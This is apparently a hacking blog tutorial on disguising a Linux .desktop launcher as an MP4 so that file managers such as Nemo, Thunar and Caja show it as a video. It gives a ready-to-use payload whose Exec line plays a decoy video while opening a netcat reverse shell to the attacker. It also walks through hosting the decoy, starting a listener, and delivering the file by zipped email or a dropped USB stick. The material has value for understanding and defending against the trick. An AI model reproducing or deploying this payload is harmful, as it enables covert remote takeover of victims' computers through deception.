title: "Exploit Linux File Managers with Fake MP4s"
excerpt: "What appears to be an ordinary MP4 may have been designed by an attacker to compromise a Linux operating system. Opening the file will indeed play the intended video, but also silently create a connection to the attacker's system."

While this article uses Linux Mint as an example, the attack takes advantage of an issue in several Linux file managers. The below GIF demonstrates the attack.

<img src="img/009/009-01.gif" width="1080"> 

Two files are being extracted in the GIF. The first (real_video.mp4) is a real MP4. The second (fake_video.mp4) is a [.desktop](https://www.reviversoft.com/file-extensions/desktop) file, configured to look like an ordinary MP4 in this file manager. What we can't see in the GIF is the Netcat connection being made to the attacker's system when fake_video.mp4 opens. The target believes fake_video.mp4 is legitimate and has no idea the operating system was just compromised.

The .desktop file extension is used in Linux systems to create application launchers. Linux Mint users can list files in the `/usr/share/applications/` directory for some examples of this.

```
$ ls -l /usr/share/applications/*.desktop

```

Viewing this directory in Linux Mint's built-in file manager, Nemo, the very same .desktop files appear as clickable buttons.

![](img/009/009-02.jpg)

Using `cat` on one of the operating system's legitimate .desktop files will display the following data.

```
$ cat /usr/share/applications/cinnamon-settings-calendar.desktop

[Desktop Entry]
Icon=cs-date-time
Exec=cinnamon-settings calendar
Type=Application
OnlyShowIn=X-Cinnamon;
Categories=Settings;
```

The most important lines to take note of are the `Icon=` and `Exec=` values. The Icon value is responsible for the icon used to represent the .desktop file. The `Exec=` value is responsible for the command(s) executed when the target clicks the .desktop file. In this case, clicking the file executes the `cinnamon-settings` command with the `calendar` option. Clicking this file will open the "Date & Time" settings window.

An attacker can abuse this functionality to change how the .desktop file appears to the user and which program(s) launch when the file is clicked.

### Which Operating Systems Are Affected?

Each operating system uses a different file manager by default. GNOME uses the Nautilus file manager, and KDE uses Dolphin. Neither of these file managers is vulnerable. But! Keep in mind — it's possible to install and use multiple file managers in a single operating system, much like having two different web browsers installed simultaneously. So a GNOME target may be using a different, vulnerable file manager.

##### Unaffected Systems:

- Ubuntu 18.04/GNOME/Nautilus
- Debian 10/GNOME/Nautilus
- Elementary OS 5/Pantheon/Pantheon-Files
- Manjaro 18/KDE/Dolphin

#### Affected Systems:

- Linux Mint 19.2/Cinnamon/Nemo
- Xubuntu 18.04/XFCE4/Thunar
- Fedora 30/MATE/Caja
- MX Linux/XFCE4/Thunar


### How to Identify if a Target is Vulnerable

Identifying if the target is using a vulnerable file manager is not an easy task, especially if the attacker knows nothing about the operating system. However, if the attacker shares a Wi-Fi network with the target, it would be possible to [observe traffic transmitting to and from the operating system](https://null-byte.wonderhowto.com/how-to/stealthfully-sniff-wi-fi-activity-without-connecting-target-router-0183444/). The DNS requests for a Linux Mint operating system appear as follows.

Similarly, MX Linux operating systems use custom repositories (shown below) when fetching system updates.

<img src="img/009/009-04.jpg" width="1080"> 

## Setup the Attack

Setup a simple HTTP server in Kali to host the `real_video.mp4` file. When the target clicks on the `fake_video.desktop`, it will silently download and automatically play the `real_video.mp4`. 

```
$ apt-get update && apt-get install python3

Reading package lists... Done
Reading package lists... Done
Building dependency tree
Reading state information... Done
python3 is already the newest version (3.7.2-1).
python3 set to manually installed.
0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
```

Create a temporary directory to store files necessary to the attack.

```
$ mkdir -p /tmp/pythonServer/videos; cd /tmp/pythonServer/videos/
```

The version of `youtube-dl` in the Kali Linux repository is usually a bit outdated, so reference the [GitHub repo](https://github.com/ytdl-org/youtube-dl) for the latest version. Use the below command to install it.

```
$ curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl
```

Give the new `youtube-dl` binary permissions to run on the system.

```
$ chmod a+rx /usr/local/bin/youtube-dl
```

For demonstration purposes, I'll use the [rickroll](https://en.wikipedia.org/wiki/Rickrolling) video.

```
$ youtube-dl --restrict-filenames -f 18 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'

[youtube] dQw4w9WgXcQ: Downloading webpage
[youtube] dQw4w9WgXcQ: Downloading video info webpage

```

The filename will likely consist of erroneous characters. For simplicity, rename the video file.

```
$ mv Rick*.mp4 real_video.mp4
```

### Create the Payload

Create a new file.

```
$ nano fake_video.desktop
```

Copy the below text into the new file. The .desktop file extension is vital; the attack won't work without it.

```
#!/usr/bin/env xdg-open

[Desktop Entry]
Encoding=UTF-8
Name=fake_video.mp4
Exec=/usr/bin/wget 'http://192.168.1.XX/real_video.mp4' -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc 192.168.1.XX 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &
Terminal=false
Type=Application
Icon=video-x-generic
```

Several commands are executed and concatenated into one-line. I'll break it down to better explain each command.

- `/usr/bin/wget 'http://192.168.1.XX/real_video.mp4' -O /tmp/real_video.mp4;` — Wget downloads the real_video.mp4 file from the attacker's system (192.168.1.XX). It is saved (-O) to the /tmp directory with the same filename.
- `/usr/bin/xdg-open /tmp/real_video.mp4;` — The xdg-open command will open files with the target's operating system's preferred video player. If the target prefers VLC over MPV or another Linux video player, the real_video.mp4 will automatically play on VLC. Opening the video with the preferred media player will hopefully prevent the target from discovering the fake_video.desktop.
- `/usr/bin/mkfifo /tmp/f;` — Mkfifo will create a named pipe to redirect all of the following Netcat data to and from the attacker's system.
- `/bin/nc 192.168.1.XX 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &` — Netcat and Bash are used (with the named pipe) to connect back to the attackers systems (remember to change the XX in the IP address here). The port number (1234) is arbitrary and can be any number between 1 and 65535.

The `Icon=` image can be changed here. Icon filenames are found in the `/usr/share/icons/Mint-Y/mimetypes/128/` directory. The file extension (.png) can be omitted when creating .desktop files, but it's not necessary. Any file in the `/usr/share/icons/` directory is usable as a .desktop file icon.

For example, text files (text-x-generic) and other filetypes with a supporting PNG in the icons/ directory is usable. There's a lot of room to be creative with social engineering attacks here (fake TXT file shown below).

![](img/009/009-05.jpg)

Change the `fake_video.desktop` file permissions to elevate its privileges.

```
$ chmod +x fake_video.desktop
```

The new permissions are verified by listing the directory contents. Notice the execute (`-rwxr-xr-x`) permissions.

```
$ ls -l

-rwxr-xr-x 1 root root      353 Apr 12 06:27 fake_video.desktop
-rw-r--r-- 1 root root 15915462 Dec 10 01:55 real_video.mp4
```

### Start the Python3 Server & Netcat Listener

Python3 will create a web server on port 80, making the `real_video.mp4` in the directory available to everyone on the network. The Python3 terminal must remain open until the target clicks on the `fake_video.desktop` file. 

```
$ python3 -m http.server 80
```

Open a new terminal window, start the `nc` listener to intercept connections from the compromised Linux box.

```
$ nc -vv -l -p 1234
```

### Deliver the Nefarious File

With the Python3 and Netcat servers setup, the attacker can deliver `fake_video.desktop` to the target. I've outlined two simple delivery methods below, but this is far from an exhaustive list of attack vectors. Other tactics are possible if the attacker knows more about the target.

###### Option 1: Email Attachment

Email is a good file sharing vector. If the target's operating system has been discovered or it's known that Linux systems are deployed in the workplace email delivery will be an ideal option. In this scenario, compressing the file(s) with `zip` is necessary to bypass email clients and web browsers from displaying the .desktop file extension when sharing the file.

It may be desirable to include many .desktop payloads in the ZIP sent to the target for a convincing social engineering attack. Or, perhaps mixing real files in with fake_videos.

First, make sure `zip` is installed, as it isn't included in all versions of Kali.

```
$ apt-get install zip
```

While in the `videos/` directory, use `zip` to recursively compress all of the files.

```
$ zip -r videos.zip ../videos/

  adding: ../videos/ (stored 0%)
  adding: ../videos/real_video.mp4 (deflated 0%)
  adding: ../videos/fake_video.desktop (deflated 33%)
```

###### Option 2: USB Drop

Readers may know [I'm a fan of USB drop attacks](/0x01). Nearly 50% of all USBs found in the wild are picked up, inserted into a computer, and inspected by unsuspecting targets. The lone USB is an excellent attack vector as it specifically targets the computer — an email attachment may be opened using the target's smartphone. When the target inserts the USB drive into his/her machine, Nemo will automatically attempt to mount it and display the `fake_video.desktop` as "fake_video.mp4" — so compressing the files won't be necessary.

To perform a USB drop attack, copy the `fake_video.desktop` to the drive.

```
$ cp /tmp/pythonServer/videos/*.desktop /media/root/USB\ NAME\ HERE/
```
